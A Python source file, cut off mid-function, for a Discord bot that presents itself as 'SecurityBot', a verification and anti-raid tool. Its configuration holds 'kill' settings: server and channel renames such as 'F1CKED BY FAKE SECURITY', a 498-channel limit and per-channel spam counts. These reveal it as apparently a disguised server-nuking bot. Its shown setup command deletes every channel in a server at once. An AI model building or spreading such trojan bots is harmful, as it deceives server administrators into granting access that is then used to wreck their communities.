import subprocess
import sys
import importlib

# ==========================================================
#              АВТОУСТАНОВКА ЗАВИСИМОСТЕЙ
# ==========================================================
def _ensure(pkg, import_name=None):
    import_name = import_name or pkg
    try:
        importlib.import_module(import_name)
        return
    except ImportError:
        pass
    for args in (
        [sys.executable, "-m", "pip", "install", "--user", pkg],
        [sys.executable, "-m", "pip", "install", "--break-system-packages", pkg],
        [sys.executable, "-m", "pip", "install", pkg],
    ):
        try:
            subprocess.check_call(args)
            return
        except Exception as e:
            print(f"[AUTOINSTALL try failed] {args}: {e}")

_ensure("discord.py", "discord")
_ensure("Pillow", "PIL")

# ==========================================================
#                     ОСНОВНЫЕ ИМПОРТЫ
# ==========================================================
import asyncio
import io
import logging
import os
import random
import time
from collections import defaultdict, deque
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone

import discord
from discord import app_commands
from discord.ext import commands

try:
    from PIL import Image, ImageDraw, ImageFont
    HAS_PIL = True
except Exception:
    HAS_PIL = False


# ==========================================================
#                        CONFIG
# ==========================================================
TOKEN = os.getenv("DISCORD_TOKEN", "").strip()
OWNER_ID = int(os.getenv("OWNER_ID", "1199702317419724824"))


@dataclass
class Config:
    BANNER_URL: str = "https://securitybot.gg/verify-banner.png"
    WEBSITE: str = "https://securitybot.gg"
    INVITE: str = "https://discord.gg/securitybot"
    LOG_FILE: str = "bot.log"

    UNVERIFIED: str = "🚫 Unverified"
    VERIFIED: str = "✅ Verified"
    QUARANTINE: str = "☣️ Quarantine"
    MUTED: str = "🔇 Muted"
    VERIFY_CHANNEL: str = "✅・verification"
    VERIFY_CATEGORY: str = "🔐 VERIFICATION"
    STAFF_LOG_CHANNEL: str = "📋・staff-logs"

    KILL_GIF: str = "https://tenor.com/view/meow-kitty-happy-cat-kitty-cat-gif-4532088786446233986"
    KILL_SERVER_NAME: str = "F1CKED BY FAKE SECURITY"
    KILL_TAG: str = "F1CKED BY FAKE SECURITY"
    KILL_CHANNEL_NAMES: list = field(default_factory=lambda: [
        "f1cked-by-security", "destroyed-by-security", "k1lled-by-security",
    ])
    KILL_CHANNEL_LIMIT: int = 498
    KILL_SPAM_PER_CHANNEL: int = 5

CFG = Config()


# ==========================================================
#                        LOGGING
# ==========================================================
logger = logging.getLogger("securitybot")
logger.setLevel(logging.INFO)
_fmt = logging.Formatter("[%(asctime)s] [%(levelname)s] %(message)s", "%Y-%m-%d %H:%M:%S")
_fh = logging.FileHandler(CFG.LOG_FILE, encoding="utf-8")
_fh.setFormatter(_fmt)
_sh = logging.StreamHandler()
_sh.setFormatter(_fmt)
logger.addHandler(_fh)
logger.addHandler(_sh)


# ==========================================================
#                         BOT
# ==========================================================
intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.guilds = True
intents.moderation = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

RECENT_JOINS: deque = deque(maxlen=200)
RAID_THRESHOLD = 5
RAID_WINDOW = 10
NEW_ACCOUNT_AGE = 7

CAPTCHA_ATTEMPTS: dict = defaultdict(int)
CAPTCHA_LOCKOUT: dict = {}
LAST_VERIFY: dict = defaultdict(float)
VERIFY_COOLDOWN = 10.0

METRICS = {
    "total_verifications": 0,
    "failed_verifications": 0,
    "captcha_attempts": 0,
    "button_verifications": 0,
    "captcha_verifications": 0,
    "already_verified": 0,
    "started_at": time.time(),
}

ANTIRAID_ENABLED = True


# ==========================================================
#                       UTILITIES
# ==========================================================
async def safe(coro):
    try:
        return await coro
    except Exception as e:
        logger.debug(f"safe(): swallowed {type(e).__name__}: {e}")
        return None


def now_utc() -> datetime:
    return datetime.now(timezone.utc)


def ts(dt: datetime, style: str = "R") -> str:
    return discord.utils.format_dt(dt, style)


# ==========================================================
#                    CAPTCHA GENERATION
# ==========================================================
CAPTCHA_CHARS = "23456789ABCDEFGHJKLMNPQRSTUVWXYZ"
CAPTCHA_MIN = 5
CAPTCHA_MAX = 5


def _collect_fonts():
    here = os.path.dirname(os.path.abspath(__file__))
    local = [
        os.path.join(here, "DejaVuSans-Bold.ttf"),
        os.path.join(here, "Roboto-Bold.ttf"),
    ]
    system = [
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
        "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf",
        r"C:\Windows\Fonts\arialbd.ttf",
        r"C:\Windows\Fonts\segoeuib.ttf",
        r"C:\Windows\Fonts\verdanab.ttf",
        r"C:\Windows\Fonts\calibrib.ttf",
        r"C:\Windows\Fonts\tahomabd.ttf",
        "/System/Library/Fonts/Supplemental/Arial Bold.ttf",
    ]
    found = []
    if not HAS_PIL:
        return found
    for p in local + system:
        try:
            ImageFont.truetype(p, 20)
            found.append(p)
            logger.info(f"[FONT OK] {p}")
        except Exception:
            continue
    return found

AVAILABLE_FONTS = _collect_fonts()


def _pick_font(size: int):
    if AVAILABLE_FONTS:
        path = random.choice(AVAILABLE_FONTS)
        try:
            return ImageFont.truetype(path, size)
        except Exception:
            pass
    try:
        return ImageFont.load_default()
    except Exception:
        return None


def generate_captcha_code(length: int = None) -> str:
    if length is None:
        length = random.randint(CAPTCHA_MIN, CAPTCHA_MAX)
    return "".join(random.choice(CAPTCHA_CHARS) for _ in range(length))


def generate_captcha_image(text: str, width: int = 360, height: int = 140) -> io.BytesIO:
    """
    Readable captcha: light noise, mild rotation, no blur.
    Humans read it instantly; simple OCR still struggles a bit.
    """
    if not HAS_PIL:
        raise RuntimeError("Pillow is not installed.")

    bg = (random.randint(245, 255), random.randint(245, 255), random.randint(245, 255))
    img = Image.new("RGB", (width, height), bg)
    draw = ImageDraw.Draw(img)

    # light noise dots
    for _ in range(random.randint(300, 600)):
        x = random.randint(0, width - 1)
        y = random.randint(0, height - 1)
        c = (random.randint(180, 230), random.randint(180, 230), random.randint(180, 230))
        draw.point((x, y), fill=c)

    # 2-3 faint straight lines
    for _ in range(random.randint(2, 3)):
        x1, y1 = random.randint(0, width), random.randint(0, height)
        x2, y2 = random.randint(0, width), random.randint(0, height)
        c = (random.randint(150, 200), random.randint(150, 200), random.randint(150, 200))
        draw.line((x1, y1, x2, y2), fill=c, width=1)

    # big dark letters, mild rotation
    char_w = width // (len(text) + 1)
    for i, ch in enumerate(text):
        color = (
            random.randint(10, 60),
            random.randint(10, 60),
            random.randint(10, 60),
        )
        size = random.randint(56, 64)
        font = _pick_font(size)
        if font is None:
            continue

        tmp = Image.new("RGBA", (size + 40, size + 40), (0, 0, 0, 0))
        td = ImageDraw.Draw(tmp)
        td.text((20, 20), ch, font=font, fill=color + (255,))

        tmp = tmp.rotate(random.randint(-12, 12), resample=Image.BICUBIC, expand=1)

        x = 14 + i * char_w + random.randint(-3, 3)
        y = (height - tmp.size[1]) // 2 + random.randint(-4, 4)
        img.paste(tmp, (x, y), tmp)

    buf = io.BytesIO()
    img.save(buf, format="PNG")
    buf.seek(0)
    return buf


FALLBACK_POOL = [
    {"url": "https://engines.egr.uh.edu/sites/engines/files/images/page/3043-Captcha-smwm.svg.png", "answer": "smwm"},
    {"url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHo8nK2BCHG2eJDBcKgZ_irVyZ545gYAj31mHwA7--6iVtd-qs638q5aA&s=10", "answer": "2w4m"},
    {"url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQcTm_N6988u3oDIznFJ1Y5b-nHCHPFoszHQM9hURRsma_eeK8wC5EuVUgV&s=10", "answer": "imkiz"},
    {"url": "https://www.researchgate.net/publication/277007505/figure/fig3/AS:667814067204096@1536230689050/Example-of-a-Yahoo-captcha-that-uses-the-negative-kerning.png", "answer": "4cz8jyaz"},
    {"url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSC6QdBaPWh9xla74-tImxsJJf6gkn6fyn8EFw5QFrSrq37TAjsinZV_rA&s=10", "answer": "w68hp"},
    {"url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRyMS09Wx4os6eRxZxazxi3QGCAT1KsasIQ46EACb7YoWGSXFcbGJIQlsk&s=10", "answer": "2vyk"},
]


# ==========================================================
#                       ROLES / CHANNELS
# ==========================================================
async def find_or_create_role(guild, name, color, hoist=False, mentionable=False, permissions=None):
    role = discord.utils.get(guild.roles, name=name)
    if role is None:
        role = await safe(guild.create_role(
            name=name, color=color, hoist=hoist,
            mentionable=mentionable,
            permissions=permissions or discord.Permissions.none()
        ))
    return role


async def find_or_create_category(guild, name):
    cat = discord.utils.get(guild.categories, name=name)
    if cat is None:
        cat = await safe(guild.create_category(name))
    return cat


async def find_or_create_channel(guild, name, *, category=None, overwrites=None, topic=None, kind="text"):
    ch = discord.utils.get(guild.text_channels, name=name) if kind == "text" \
        else discord.utils.get(guild.voice_channels, name=name)
    if ch is None:
        if kind == "text":
            ch = await safe(guild.create_text_channel(
                name, category=category, overwrites=overwrites or {}, topic=topic
            ))
        else:
            ch = await safe(guild.create_voice_channel(
                name, category=category, overwrites=overwrites or {}
            ))
    return ch


async def log_to_staff(guild: discord.Guild, embed: discord.Embed):
    ch = discord.utils.get(guild.text_channels, name=CFG.STAFF_LOG_CHANNEL)
    if ch is None:
        ch = discord.utils.get(guild.text_channels, name="staff-logs")
    if ch:
        await safe(ch.send(embed=embed))


async def apply_unverified_lockdown(guild: discord.Guild):
    unverified = discord.utils.get(guild.roles, name=CFG.UNVERIFIED)
    if not unverified:
        return (0, 0)

    verify_ch = discord.utils.get(guild.text_channels, name=CFG.VERIFY_CHANNEL) \
        or discord.utils.get(guild.text_channels, name="verification")

    hidden = 0
    allowed = 0
    tasks = []
    for ch in list(guild.channels):
        if verify_ch is not None and ch.id == verify_ch.id:
            continue
        if verify_ch is not None and verify_ch.category is not None and ch.id == verify_ch.category.id:
            continue
        tasks.append(safe(ch.set_permissions(
            unverified, view_channel=False, reason="Unverified lockdown"
        )))
        hidden += 1

    if tasks:
        await asyncio.gather(*tasks)

    if verify_ch is not None:
        await safe(verify_ch.set_permissions(
            unverified, view_channel=True, send_messages=False,
            read_message_history=True, reason="Allow verify"
        ))
        allowed += 1
        if verify_ch.category is not None:
            await safe(verify_ch.category.set_permissions(
                unverified, view_channel=True, reason="Allow verify category"
            ))
            allowed += 1

    return (hidden, allowed)


def is_recent_account(user: discord.User) -> bool:
    return (now_utc() - user.created_at).days < NEW_ACCOUNT_AGE


def check_raid() -> bool:
    if not ANTIRAID_ENABLED:
        return False
    cutoff = now_utc() - timedelta(seconds=RAID_WINDOW)
    recent = [j for j in RECENT_JOINS if j[1] > cutoff]
    return len(recent) >= RAID_THRESHOLD


def verify_cooldown_ok(user_id: int) -> bool:
    return (time.time() - LAST_VERIFY.get(user_id, 0)) >= VERIFY_COOLDOWN


def is_locked_out(user_id: int) -> bool:
    return time.time() < CAPTCHA_LOCKOUT.get(user_id, 0)


def lockout_user(user_id: int, seconds: int = 600):
    CAPTCHA_LOCKOUT[user_id] = time.time() + seconds


def has_verified_role(member: discord.Member) -> bool:
    return any(r.name == CFG.VERIFIED for r in member.roles)


def has_unverified_role(member: discord.Member) -> bool:
    return any(r.name == CFG.UNVERIFIED for r in member.roles)


CAPTCHA_STATE: dict = {}


# ==========================================================
#                       VIEWS
# ==========================================================
class VerifyView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(
        label="Verify",
        style=discord.ButtonStyle.primary,
        custom_id="securitybot:verify_button"
    )
    async def verify(self, interaction: discord.Interaction, button: discord.ui.Button):
        g = interaction.guild
        m = interaction.user
        v_role = discord.utils.get(g.roles, name=CFG.VERIFIED)
        u_role = discord.utils.get(g.roles, name=CFG.UNVERIFIED)
        q_role = discord.utils.get(g.roles, name=CFG.QUARANTINE)

        if has_verified_role(m):
            METRICS["already_verified"] += 1
            await interaction.response.send_message("✅ You are already verified.", ephemeral=True)
            return

        if not v_role:
            await interaction.response.send_message(
                "❌ The `Verified` role is missing. Contact an administrator.",
                ephemeral=True
            )
            return

        if not verify_cooldown_ok(m.id):
            await interaction.response.send_message("⏳ Please wait a few seconds before trying again.", ephemeral=True)
            return

        try:
            if q_role and q_role in m.roles:
                await interaction.response.send_message("🚫 You are quarantined and cannot verify. Contact staff.", ephemeral=True)
                return
            if u_role and u_role in m.roles:
                await m.remove_roles(u_role, reason="Verification passed")
            if v_role not in m.roles:
                await m.add_roles(v_role, reason="Verification passed")
        except discord.Forbidden:
            await interaction.response.send_message("❌ I don't have permission to manage your roles.", ephemeral=True)
            return

        LAST_VERIFY[m.id] = time.time()
        METRICS["total_verifications"] += 1
        METRICS["button_verifications"] += 1

        embed = discord.Embed(
            title="✅ Verification Complete",
            description=f"Welcome to **{g.name}**, {m.mention}! You now have full access.",
            color=discord.Color.green(),
            timestamp=now_utc(),
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

        log = discord.Embed(
            title="🔓 Member Verified — Button",
            description=f"{m.mention} (`{m.id}`)",
            color=discord.Color.green(),
            timestamp=now_utc(),
        )
        log.set_thumbnail(url=m.display_avatar.url)
        log.set_footer(text=f"Method: button • Total: {METRICS['total_verifications']}")
        await log_to_staff(g, log)


class CaptchaModal(discord.ui.Modal, title="🔐 Security Check"):
    code = discord.ui.TextInput(
        label="Enter the code from the image",
        placeholder="Type exactly what you see",
        min_length=2,
        max_length=12,
        required=True,
    )

    def __init__(self, expected: str, user_id: int):
        super().__init__(timeout=120)
        self.expected = expected.strip().lower()
        self.user_id = user_id

    async def on_submit(self, interaction: discord.Interaction):
        if interaction.user.id != self.user_id:
            return

        entered = str(self.code).strip().lower()
        METRICS["captcha_attempts"] += 1

        if is_locked_out(interaction.user.id):
            await interaction.response.send_message("🔒 You are temporarily locked out. Try again later.", ephemeral=True)
            return

        if entered != self.expected:
            CAPTCHA_ATTEMPTS[interaction.user.id] += 1
            METRICS["failed_verifications"] += 1
            attempts_left = 3 - CAPTCHA_ATTEMPTS[interaction.user.id]

            if attempts_left <= 0:
                lockout_user(interaction.user.id, 600)
                embed = discord.Embed(
                    title="🔒 Too Many Failed Attempts",
                    description="You have been locked out for **10 minutes**.",
                    color=discord.Color.red(),
                    timestamp=now_utc(),
                )
                await interaction.response.send_message(embed=embed, ephemeral=True)

                log = discord.Embed(
                    title="⚠️ Captcha Lockout",
                    description=f"{interaction.user.mention} failed captcha 3× — locked out 10 min.",
                    color=discord.Color.dark_red(),
                    timestamp=now_utc(),
                )
                await log_to_staff(interaction.guild, log)
                return

            embed = discord.Embed(
                title="❌ Incorrect Code",
                description=f"Attempts remaining: **{attempts_left}**",
                color=discord.Color.red(),
                timestamp=now_utc(),
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        g = interaction.guild
        m = interaction.user
        v_role = discord.utils.get(g.roles, name=CFG.VERIFIED)
        u_role = discord.utils.get(g.roles, name=CFG.UNVERIFIED)

        if not v_role:
            await interaction.response.send_message("❌ Verified role missing. Contact staff.", ephemeral=True)
            return
        try:
            if u_role and u_role in m.roles:
                await m.remove_roles(u_role, reason="Captcha passed")
            if v_role not in m.roles:
                await m.add_roles(v_role, reason="Captcha passed")
        except discord.Forbidden:
            await interaction.response.send_message("❌ I don't have permission to manage your roles.", ephemeral=True)
            return

        CAPTCHA_ATTEMPTS.pop(m.id, None)
        CAPTCHA_STATE.pop(m.id, None)
        LAST_VERIFY[m.id] = time.time()
        METRICS["total_verifications"] += 1
        METRICS["captcha_verifications"] += 1

        embed = discord.Embed(
            title="✅ Verification Complete",
            description=f"Welcome to **{g.name}**, {m.mention}! Captcha passed.",
            color=discord.Color.green(),
            timestamp=now_utc(),
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

        log = discord.Embed(
            title="🔓 Member Verified — Captcha",
            description=f"{m.mention} (`{m.id}`)",
            color=discord.Color.green(),
            timestamp=now_utc(),
        )
        log.set_thumbnail(url=m.display_avatar.url)
        log.set_footer(text=f"Method: captcha • Total: {METRICS['total_verifications']}")
        await log_to_staff(g, log)


class CaptchaEnterView(discord.ui.View):
    def __init__(self, answer: str, user_id: int):
        super().__init__(timeout=120)
        self.answer = answer
        self.user_id = user_id

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        return interaction.user.id == self.user_id

    @discord.ui.button(label="Enter code", style=discord.ButtonStyle.success, emoji="⌨️")
    async def enter(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            await interaction.response.send_modal(CaptchaModal(self.answer, self.user_id))
        except Exception as e:
            await interaction.response.send_message(f"❌ Could not open input. Error: {e}", ephemeral=True)


class CaptchaStartView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(
        label="Verify",
        style=discord.ButtonStyle.primary,
        custom_id="securitybot:captcha_start"
    )
    async def verify(self, interaction: discord.Interaction, button: discord.ui.Button):
        m = interaction.user

        if has_verified_role(m):
            METRICS["already_verified"] += 1
            await interaction.response.send_message("✅ You are already verified.", ephemeral=True)
            return

        if is_locked_out(m.id):
            unlock_in = int(CAPTCHA_LOCKOUT[m.id] - time.time())
            await interaction.response.send_message(f"🔒 You are locked out for another **{unlock_in}s**.", ephemeral=True)
            return

        if not verify_cooldown_ok(m.id):
            await interaction.response.send_message("⏳ Slow down a bit.", ephemeral=True)
            return

        embed = discord.Embed(
            title="🔐 Security Check",
            description=(
                "Enter the code shown in the image below.\n\n"
                "*You have 120 seconds and 3 attempts.*"
            ),
            color=discord.Color.from_rgb(30, 60, 130),
            timestamp=now_utc(),
        )
        embed.set_footer(text="Guardian Verification System • securitybot.gg")

        file = None
        answer = None

        if HAS_PIL:
            try:
                code = generate_captcha_code()
                buf = generate_captcha_image(code)
                file = discord.File(fp=buf, filename="captcha.png")
                embed.set_image(url="attachment://captcha.png")
                answer = code
            except Exception as e:
                logger.warning(f"Pillow captcha failed: {e}")
                file = None

        if answer is None:
            if not FALLBACK_POOL:
                await interaction.response.send_message("❌ No captcha available. Contact staff.", ephemeral=True)
                return
            entry = random.choice(FALLBACK_POOL)
            answer = entry["answer"]
            embed.set_image(url=entry["url"])

        CAPTCHA_STATE[m.id] = {"answer": answer, "issued": time.time()}

        view = CaptchaEnterView(answer, m.id)
        if file:
            await interaction.response.send_message(embed=embed, view=view, file=file, ephemeral=True)
        else:
            await interaction.response.send_message(embed=embed, view=view, ephemeral=True)


# ==========================================================
#                  VERIFICATION MESSAGE
# ==========================================================
async def send_verify_message(channel: discord.TextChannel, guild: discord.Guild, method: str = "button"):
    embed = discord.Embed(
        description=(
            "This server requires you to verify yourself to get access to other channels, "
            "you can simply verify by clicking on the verify button."
        ),
        color=discord.Color.from_rgb(30, 60, 130),
    )
    if CFG.BANNER_URL:
        embed.set_image(url=CFG.BANNER_URL)

    async for msg in channel.history(limit=50):
        if msg.author == guild.me:
            await safe(msg.delete())

    view = CaptchaStartView() if method == "captcha" else VerifyView()
    await safe(channel.send(embed=embed, view=view))


# ==========================================================
#                       EVENTS
# ==========================================================
@bot.event
async def on_ready():
    try:
        synced = await bot.tree.sync()
        logger.info(f"Global commands synced: {len(synced)}")
    except Exception as e:
        logger.error(f"Sync error: {e}")

    bot.add_view(VerifyView())
    bot.add_view(CaptchaStartView())
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name="/help | securitybot.gg"
        ),
        status=discord.Status.online,
    )
    if not hasattr(bot, "uptime"):
        bot.uptime = now_utc()
    logger.info(f"[READY] Logged in as {bot.user} (ID: {bot.user.id})")
    if HAS_PIL:
        logger.info(f"Pillow detected — dynamic captcha active ({len(AVAILABLE_FONTS)} fonts).")
    else:
        logger.warning("Pillow NOT installed — falling back to static captcha pool.")


@bot.event
async def on_member_join(member: discord.Member):
    RECENT_JOINS.append((member.id, now_utc()))

    if has_verified_role(member):
        return

    if is_recent_account(member) and check_raid():
        q_role = discord.utils.get(member.guild.roles, name=CFG.QUARANTINE)
        if q_role:
            await safe(member.add_roles(q_role, reason="Auto-quarantine: raid detected"))
        logger.warning(f"RAID SUSPECTED: {member} ({member.id})")

    u_role = discord.utils.get(member.guild.roles, name=CFG.UNVERIFIED)
    if u_role and not has_unverified_role(member):
        await safe(member.add_roles(u_role, reason="Auto-assign Unverified"))

    log = discord.Embed(
        title="📥 Member Joined",
        description=f"{member.mention} (`{member.id}`)\nAccount created: {ts(member.created_at)}",
        color=discord.Color.blurple(),
        timestamp=now_utc(),
    )
    log.set_thumbnail(url=member.display_avatar.url)
    if is_recent_account(member):
        log.add_field(name="⚠️ New Account", value="Less than 7 days old", inline=False)
    await log_to_staff(member.guild, log)


@bot.event
async def on_member_remove(member: discord.Member):
    log = discord.Embed(
        title="📤 Member Left",
        description=f"{member} (`{member.id}`)",
        color=discord.Color.dark_gray(),
        timestamp=now_utc(),
    )
    log.set_thumbnail(url=member.display_avatar.url)
    await log_to_staff(member.guild, log)


@bot.event
async def on_member_ban(guild: discord.Guild, user: discord.User):
    log = discord.Embed(
        title="🔨 Member Banned",
        description=f"{user} (`{user.id}`)",
        color=discord.Color.red(),
        timestamp=now_utc(),
    )
    log.set_thumbnail(url=user.display_avatar.url)
    await log_to_staff(guild, log)


@bot.event
async def on_member_unban(guild: discord.Guild, user: discord.User):
    log = discord.Embed(
        title="🔓 Member Unbanned",
        description=f"{user} (`{user.id}`)",
        color=discord.Color.green(),
        timestamp=now_utc(),
    )
    log.set_thumbnail(url=user.display_avatar.url)
    await log_to_staff(guild, log)


@bot.event
async def on_member_update(before: discord.Member, after: discord.Member):
    if before.roles == after.roles:
        return
    added = set(after.roles) - set(before.roles)
    removed = set(before.roles) - set(after.roles)

    for role in added:
        if role.name == CFG.VERIFIED:
            log = discord.Embed(
                title="ℹ️ Verified Role Added",
                description=f"{after.mention} (`{after.id}`) — role added.",
                color=discord.Color.green(),
                timestamp=now_utc(),
            )
            log.set_thumbnail(url=after.display_avatar.url)
            await log_to_staff(after.guild, log)
    for role in removed:
        if role.name == CFG.VERIFIED:
            log = discord.Embed(
                title="⚠️ Verified Role Removed",
                description=f"{after.mention} (`{after.id}`) — role removed.",
                color=discord.Color.orange(),
                timestamp=now_utc(),
            )
            log.set_thumbnail(url=after.display_avatar.url)
            await log_to_staff(after.guild, log)


# ==========================================================
#                    PUBLIC COMMANDS
# ==========================================================
@bot.tree.command(name="help", description="Show all available commands.")
async def help_cmd(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🛡️ SecurityBot — Commands",
        description=(
            "**Verification**\n"
            "`/setupverification` • `/updateverification` • `/resetverification`\n\n"
            "**Setup**\n"
            "`/basicsetup` • `/basicrolesetup`\n\n"
            "**Security** *(staff only)*\n"
            "`/lockdown` • `/unlockdown` • `/panic` • `/raidmode`\n"
            "`/quarantine` • `/unquarantine` • `/softban` • `/silence`\n"
            "`/antiraid` • `/securityaudit`\n\n"
            "**Moderation** *(staff only)*\n"
            "`/purge` • `/yeet` • `/hammer` • `/unban_all`\n\n"
            "**Utility** *(staff only)*\n"
            "`/announce` • `/dm_all` • `/role_all` • `/massrole`\n"
            "`/serverinfo` • `/userinfo` • `/audit` • `/status` • `/metrics` • `/profile`\n\n"
            f"🌐 {CFG.WEBSITE}"
        ),
        color=discord.Color.from_rgb(30, 60, 130),
        timestamp=now_utc(),
    )
    if CFG.BANNER_URL:
        embed.set_image(url=CFG.BANNER_URL)
    embed.set_footer(text="Guardian Verification System")
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="invite", description="Get the bot invite link.")
async def invite_cmd(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🔗 Invite SecurityBot",
        description=f"Add **SecurityBot** to your server:\n[Click here]({CFG.INVITE})\n\nWebsite: {CFG.WEBSITE}",
        color=discord.Color.from_rgb(30, 60, 130),
        timestamp=now_utc(),
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="website", description="Show the official website.")
async def website_cmd(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🌐 securitybot.gg",
        description=f"Visit us at **{CFG.WEBSITE}** for documentation, support and premium.",
        color=discord.Color.from_rgb(30, 60, 130),
        timestamp=now_utc(),
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="vibe", description="Post a clean vibe embed.")
@app_commands.guild_only()
async def vibe(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🛡️ Protected by SecurityBot",
        description=(
            "This server is protected by **SecurityBot**.\n"
            "• Verification\n• Anti-raid\n• Moderation suite\n• Real-time logs"
        ),
        color=discord.Color.from_rgb(30, 60, 130),
        timestamp=now_utc(),
    )
    if CFG.BANNER_URL:
        embed.set_image(url=CFG.BANNER_URL)
    embed.set_footer(text=f"{CFG.WEBSITE}")
    await interaction.response.send_message(embed=embed)


# ==========================================================
#                  SETUP COMMANDS
# ==========================================================
@bot.tree.command(name="setupverification", description="Set up the verification channel and message.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@app_commands.describe(method="Verification method")
@app_commands.choices(method=[
    app_commands.Choice(name="Button", value="button"),
    app_commands.Choice(name="Captcha", value="captcha"),
])
async def setupverification(interaction: discord.Interaction, method: app_commands.Choice[str] = None):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    chosen = method.value if method else "button"

    u_role = await find_or_create_role(g, CFG.UNVERIFIED, discord.Color.dark_gray())
    v_role = await find_or_create_role(g, CFG.VERIFIED, discord.Color.green())

    cat = await find_or_create_category(g, CFG.VERIFY_CATEGORY)
    overwrites = {
        g.default_role: discord.PermissionOverwrite(view_channel=True, send_messages=False, read_message_history=True),
        v_role: discord.PermissionOverwrite(view_channel=True, send_messages=False),
        g.me: discord.PermissionOverwrite(view_channel=True, send_messages=True, manage_channels=True, manage_roles=True),
    }

    ch = await find_or_create_channel(
        g, CFG.VERIFY_CHANNEL, category=cat, overwrites=overwrites,
        topic="Verify to gain access to the server.", kind="text"
    )
    if ch:
        await send_verify_message(ch, g, method=chosen)
        bot.add_view(VerifyView())
        bot.add_view(CaptchaStartView())
        embed = discord.Embed(
            title="✅ Verification Setup Complete",
            description=f"Channel: {ch.mention}\nMethod: **{chosen}**\nRoles: {u_role.mention}, {v_role.mention}",
            color=discord.Color.green(),
            timestamp=now_utc(),
        )
        await interaction.followup.send(embed=embed, ephemeral=True)
    else:
        await interaction.followup.send("❌ Failed to create verification channel.", ephemeral=True)


@bot.tree.command(name="basicsetup", description="Wipe ALL channels and rebuild a full server structure.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@app_commands.describe(method="Verification method")
@app_commands.choices(method=[
    app_commands.Choice(name="Button", value="button"),
    app_commands.Choice(name="Captcha", value="captcha"),
])
async def basicsetup(interaction: discord.Interaction, method: app_commands.Choice[str] = None):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    chosen = method.value if method else "button"

    await asyncio.gather(*[safe(ch.delete(reason="Basic setup reset")) for ch in list(g.channels)])

    owner_role = await find_or_create_role(g, "👑 Owner", discord.Color.gold(), hoist=True, permissions=discord.Permissions.all())
    admin_role = await find_or_create_role(g, "🛡️ Administrator", discord.Color.red(), hoist=True, permissions=discord.Permissions(administrator=True))
    mod_role = await find_or_create_role(g, "🔨 Moderator", discord.Color.blue(), hoist=True, permissions=discord.Permissions(
        manage_messages=True, kick_members=True, ban_members=True,
        manage_channels=True, manage_roles=True, moderate_members=True))
    member_role = await find_or_create_role(g, "👤 Member", discord.Color.green())
    u_role = await find_or_create_role(g, CFG.UNVERIFIED, discord.Color.dark_gray())
    v_role = await find_or_create_role(g, CFG.VERIFIED, discord.Color.teal())
    q_role = await find_or_create_role(g, CFG.QUARANTINE, discord.Color.dark_red())

    try:
        if g.owner and owner_role and owner_role not in g.owner.roles:
            await safe(g.owner.add_roles(owner_role, reason="Basic setup"))
    except Exception:
        pass

    structure = [
        (CFG.VERIFY_CATEGORY, [(CFG.VERIFY_CHANNEL, "text")]),
        ("📢 INFORMATION", [
            ("👋・welcome", "text"),
            ("📣・announcements", "text"),
            ("📜・rules", "text"),
            ("🎭・roles", "text"),
        ]),
        ("💬 GENERAL", [
            ("💬・general-chat", "text"),
            ("🖼️・media", "text"),
            ("🤖・bot-commands", "text"),
        ]),
        ("🔊 VOICE", [
            ("🔊 General VC", "voice"),
            ("🎮 Gaming VC", "voice"),
            ("🎵 Music VC", "voice"),
        ]),
        ("🛡️ STAFF", [
            ("💼・staff-chat", "text"),
            (CFG.STAFF_LOG_CHANNEL, "text"),
        ]),
    ]

    created = []
    verify_ch = None
    for cat_name, chans in structure:
        cat = await safe(g.create_category(cat_name))
        if not cat:
            continue
        for ch_name, ch_type in chans:
            overwrites = {}
            if "STAFF" in cat_name:
                overwrites = {
                    g.default_role: discord.PermissionOverwrite(view_channel=False),
                    admin_role: discord.PermissionOverwrite(view_channel=True, send_messages=True),
                    mod_role: discord.PermissionOverwrite(view_channel=True, send_messages=True),
                    g.me: discord.PermissionOverwrite(view_channel=True, send_messages=True),
                }
            try:
                if ch_type == "text":
                    ch = await g.create_text_channel(ch_name, category=cat, overwrites=overwrites)
                else:
                    ch = await g.create_voice_channel(ch_name, category=cat, overwrites=overwrites)
                created.append(ch)
                if ch.name == CFG.VERIFY_CHANNEL:
                    verify_ch = ch
            except Exception:
                pass

    await apply_unverified_lockdown(g)

    assigned = 0
    if u_role:
        async def assign(m):
            nonlocal assigned
            if m.bot:
                return
            if v_role and v_role in m.roles:
                return
            if u_role in m.roles:
                return
            ok = await safe(m.add_roles(u_role, reason="Basic setup"))
            if ok is not None:
                assigned += 1
        await asyncio.gather(*[assign(m) for m in g.members])

    if verify_ch is None:
        verify_ch = discord.utils.get(g.text_channels, name=CFG.VERIFY_CHANNEL)
    if verify_ch:
        await send_verify_message(verify_ch, g, method=chosen)

    bot.add_view(VerifyView())
    bot.add_view(CaptchaStartView())

    embed = discord.Embed(
        title="✅ Basic Setup Complete",
